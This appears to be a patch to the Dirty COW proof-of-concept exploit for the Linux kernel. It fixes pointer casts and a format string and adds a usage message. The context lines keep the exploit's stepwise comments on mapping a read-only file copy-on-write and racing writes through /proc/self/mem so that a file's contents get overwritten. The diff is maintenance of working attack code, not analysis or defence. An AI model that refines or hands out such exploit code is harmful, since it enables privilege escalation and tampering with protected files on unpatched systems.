@@ -23,7 +23,8 @@ m00000000000000000
 #include <unistd.h>
 #include <sys/stat.h>
 #include <string.h>
- 
+#include <stdint.h>
+
 void *map;
 int f;
 struct stat st;
@@ -63,7 +64,7 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
 /*
 You have to reset the file pointer to the memory position.
 */
-    lseek(f,map,SEEK_SET);
+    lseek(f,(uintptr_t) map,SEEK_SET);
     c+=write(f,str,strlen(str));
   }
   printf("procselfmem %d\n\n", c);
@@ -75,7 +76,10 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
-  if (argc<3)return 1;
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
   pthread_t pth1,pth2;
 /*
 You have to open the file in read only mode.
@@ -95,7 +99,7 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 You have to open with PROT_READ.
 */
   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
-  printf("mmap %x\n\n",map);
+  printf("mmap %zx\n\n",(uintptr_t) map);
 /*
 You have to do it on two threads.
 */
